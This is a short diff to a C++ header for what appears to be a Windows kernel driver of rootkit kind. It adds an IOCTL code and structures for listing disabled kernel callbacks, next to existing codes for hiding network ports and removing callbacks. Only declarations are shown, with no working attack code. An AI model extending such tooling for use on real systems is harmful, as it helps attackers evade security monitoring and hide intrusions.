@@ -49,6 +49,7 @@ constexpr unsigned long IOCTL_CLEAR_HIDDEN_PORTS = static_cast<unsigned long>(CT
 constexpr unsigned long IOCTL_LIST_HIDDEN_PORTS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81E, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
 
 constexpr unsigned long IOCTL_EXEC_NOF = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81F, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
+constexpr unsigned long IOCTL_LIST_DISABLED_CALLBACKS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x820, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
 // *******************************************************************************************************
 
 // IOCTL related definitions
@@ -73,6 +74,16 @@ struct IoctlKernelCallback {
 	CallbackType Type;
 	unsigned long long CallbackAddress;
 	bool Remove;
+};
+
+struct IoctlDisabledCallbackEntry {
+	CallbackType Type;
+	unsigned long long CallbackAddress;
+};
+
+struct IoctlDisabledCallbackList {
+	SIZE_T Count;
+	IoctlDisabledCallbackEntry Callbacks[ANYSIZE_ARRAY];
 };
 
 template<typename CallbackListType>
